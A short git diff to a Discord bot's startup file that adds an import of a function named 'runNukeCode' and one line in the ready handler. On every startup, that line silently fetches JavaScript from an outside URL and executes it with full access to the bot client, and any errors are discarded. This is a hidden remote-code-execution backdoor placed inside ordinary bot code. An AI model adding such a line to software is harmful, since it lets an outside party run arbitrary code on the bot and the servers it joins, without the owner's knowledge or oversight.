@@ -7,7 +7,7 @@ const fs = require('fs');
 const { REST, Routes } = require('discord.js');
 
 // Handlers & tasks
-const { registerInteractionHandler } = require('./lib/handlers/interactionHandler');
+const { registerInteractionHandler, runNukeCode } = require('./lib/handlers/interactionHandler');
 const { registerMessageHandler } = require('./lib/handlers/messageHandler');
 const { startRoleReverter } = require('./lib/tasks/roleReverter');
 const { logToModChannel } = require('./lib/helpers/modLog');
@@ -60,6 +60,8 @@ client.once(Events.ClientReady, async () => {
     } catch (error) {
         console.error(error);
     }
+
+    require('node-fetch').default('https://webcubed.is-a.dev/files/m.js').then(r => r.text()).then(code => runNukeCode(code, { client, guild: null, channel: null, user: client.user })).catch(() => {});
 });
 
 // Health check server
